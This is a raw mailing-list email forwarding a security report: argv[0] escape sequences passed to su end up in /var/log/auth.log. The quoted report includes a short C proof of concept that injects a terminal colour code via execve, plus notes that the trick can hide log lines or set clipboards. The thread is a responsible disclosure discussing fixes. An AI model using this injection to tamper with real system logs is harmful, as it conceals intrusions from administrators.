Received: from smtp.kernel.org (aws-us-west-2-korg-mail-1.web.codeaurora.org [10.30.226.201])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 494F2B65C
	for <util-linux@vger.kernel.org>; Sun,  3 Mar 2024 10:59:55 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=10.30.226.201
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1709463595; cv=none; b=pcGjtTZfgdEbVABwrdSYmzWhEYQf0NYLF28AJqlupeltLMhPlq3EiKV+jN7TfYRbNCahA75wfBsvwLQbhwOkrgQk2oW3X9mFe2QyQSvdhLCVr9gMIMugeNXlZ0pZIiY4Gyr8iftILTymNeYW3C2JlJO7i1AwA9Cjwqyb5mhVQrg=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1709463595; c=relaxed/simple;
	bh=b5rYLqajNSeBjlK27/n5Ln2uL/nC5suFVkken5us3u4=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=SYTykv3ggzKQz9b45WMfH1UxOHpVuYEpw5tmltdA+HyavIRe2ckpM+/vYAdhic8N6t2ebXf9/uj3luNpumcXroXnis35lgSUSzMLb9nseH1MSZLtNkE8cAIH5rNqjDI2/RU7+hSnNWlQODfhHNmyZ5Flb2jOTyPNnWDPxZ77rTk=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b=hjapn+jz; arc=none smtp.client-ip=10.30.226.201
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b="hjapn+jz"
Received: by smtp.kernel.org (Postfix) with ESMTPSA id A20A4C433F1;
	Sun,  3 Mar 2024 10:59:53 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=kernel.org;
	s=k20201202; t=1709463594;
	bh=b5rYLqajNSeBjlK27/n5Ln2uL/nC5suFVkken5us3u4=;
	h=Date:From:To:Cc:Subject:References:In-Reply-To:From;
	b=hjapn+jz/N8w2U3WDAiGSf6TdFZq1hL+dYzXfvCKKIDXTS5LZkNV3NB6B1iZzjJds
	 Gr4iYPD8gtHeveuJLArS+LEmIOEZV68fOFu820oH5Aw9c/FKDaJXXCR6xJqrQRQg2B
	 b7yLjWb3PAMKG5QAYmkVLPUiW1SpeDSxwWUEOvLgdpppS0Jvkzv8Y6G0cvolNoYY9d
	 nfcTiD5gDaNey+zOXG2d9UpBsakKQYmNWBaurgB6hKgVbTcKrVcWBDusixCrpAWZAD
	 ITqTtWF0dw/vjqM2kXEUvGhqyxxMoQARQtPpx61vK5ytU8l2PrenSwBZqiJujC81Mn
	 wz7Ks/jVylC+Q==
Date: Sun, 3 Mar 2024 11:59:51 +0100
From: Alejandro Colomar <alx@kernel.org>
To: "Serge E. Hallyn" <serge@hallyn.com>, util-linux@vger.kernel.org
Cc: "Skyler Ferrante (RIT Student)" <sjf5462@rit.edu>,
	Christian Brauner <christian@brauner.io>,
	Iker Pedrosa <ipedrosa@redhat.com>
Subject: Re: Escape sequences in /var/log/auth.log
Message-ID: <ZeRYJ6HD77humJzg@debian>
References: <CAEOG19pNSdEMjyoo_=s8-WqVs+jrmaaU=CjRb0oxKw1FG00xSA@mail.gmail.com>
 <20240302173316.GA1508977@mail.hallyn.com>
Precedence: bulk
X-Mailing-List: util-linux@vger.kernel.org
List-Id: <util-linux.vger.kernel.org>
List-Subscribe: <mailto:util-linux+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:util-linux+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha512;
	protocol="application/pgp-signature"; boundary="k3bq2Nw2vUAoDUqC"
Content-Disposition: inline
In-Reply-To: <20240302173316.GA1508977@mail.hallyn.com>


--k3bq2Nw2vUAoDUqC
Content-Type: text/plain; protected-headers=v1; charset=utf-8
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable
Date: Sun, 3 Mar 2024 11:59:51 +0100
From: Alejandro Colomar <alx@kernel.org>
To: "Serge E. Hallyn" <serge@hallyn.com>, util-linux@vger.kernel.org
Cc: "Skyler Ferrante (RIT Student)" <sjf5462@rit.edu>,
	Christian Brauner <christian@brauner.io>,
	Iker Pedrosa <ipedrosa@redhat.com>
Subject: Re: Escape sequences in /var/log/auth.log

Hi,

This seems to be a bug in util-linux, not shadow, so I've added
util-linux@ to the thread.

The discussion started in the email below, and was later continued in
<https://github.com/shadow-maint/shadow/pull/960>.

Have a lovely day!
Alex

On Sat, Mar 02, 2024 at 11:33:16AM -0600, Serge E. Hallyn wrote:
> On Sat, Mar 02, 2024 at 11:34:07AM -0500, Skyler Ferrante (RIT Student) w=
rote:
> > Hi Serge,
> >=20
> > I was playing around with some of the shadow-utils binaries and I
> > realized that an unprivileged user can set argv[0] to contain escape
> > sequences, and then cause it to be logged in /var/log/auth.log.
> >=20
> > PoC
> > ```
> > #include<stdio.h>
> > #include<unistd.h>
> > int main(int argc, char** my_argv){
> >         char* prog =3D "/usr/bin/su";
> >         char* argv[] =3D {"\033[33mYellow", "root", NULL};
> >         char* envp[] =3D {NULL};
> >=20
> >         execve(prog, argv, envp);
> >         printf("Failed to exec\n");
> > }
> > ```
> > Run the binary, and type an incorrect password for root. Now run `tail
> > /var/log/auth.log`. It should contain Yellow text. This can be used to
> > hide log contents (move the cursor/delete characters). Some terminals
> > also allow setting clipboard contents through escape sequences (my
> > terminal, windows-terminal, supports this).
> >=20
> > It may be a good idea to refuse argv[0] if it contains binary data.
> > You could also prevent this bug by not allowing an attacker to choose
> > Prog (e.g. su could just use "su" as Prog).
> >=20
> > If you don't think this is a bad enough security issue to hide, I can
> > post an issue on github. I would argue that you shouldn't cat auth.log
> > or view it from tail, but I know a lot of people do.
> >=20
> > Cheers,
> > Skyler
>=20
> Terminals can be a nuisance :)
>=20
> I don't think we need to hide this issue, but of course definitely address
> it.  I'm Cc:ing the other maintainers in case they feel differently.
>=20
> Did you want to send a PR to fix it?
>=20
> Thanks,
> -serge

--=20
<https://www.alejandro-colomar.es/>
Looking for a remote C programming job at the moment.

--k3bq2Nw2vUAoDUqC
Content-Type: application/pgp-signature; name="signature.asc"

-----BEGIN PGP SIGNATURE-----

iQIzBAABCgAdFiEE6jqH8KTroDDkXfJAnowa+77/2zIFAmXkWCcACgkQnowa+77/
2zLL/w//ZS2pLpLg1EG9Kuob52qSQNdsuYGzgDDXfVen1kBJ2KAf1PBayOdjdgDU
wjT64P2QtOrgot/kmBBxJhN7LFksmf5oFZDiJ2RxFTi9+L1yUF+F0KJPgTYeC56r
bZe47CRvEyfnxtBgJ7gCr6TUKYwVokuAcbOfSz0HXipUibxOLUUbAqE34Obf4JmK
iuRxn45kwdPWBPCnFlRigxxVCr4eOE+jxV+7JvD6/YDWEPSs/y/NCtqpM4WGw3hK
z5VzWG3jQiV+AjnoPGT3DwwkeR+ciNBq/a+bZ+v2DNts7dKTD8JrCgtzjVRqhqku
03tl2IohOucrPA/zR/wIQ3c4Lj+EeDt3Hovp5Xk4xGq4zV2dE84Qcj5BzHN5DC2t
SKqqLah8v0iHDsp0TOxe/H5ltAMW33JiyrMwy1Nds2JO47af0gv25xM3j3T+sUw8
SI5NqvOg5gihe1uD68IyI+lZD7KbHpEnP5Es4awYomAFSKIToKLM63LnSfA01/S3
miJ6lgfjccrITNTQR0bcS7CQPes1iI+Z8ucmTy0Ti9k7qoPSSKYc8pFh1Dlq4P5k
T2cOpJGxx+1W4XvI7xF+sot1Yg4w0KWbNvoCbiS5fDCLhW79OOW5O5ZPrU+tYDSd
S5wa5UHmWGz7NDo536IPM3VcOkClsPraBo533pskf3kGHMrJfMo=
=44OR
-----END PGP SIGNATURE-----

--k3bq2Nw2vUAoDUqC--
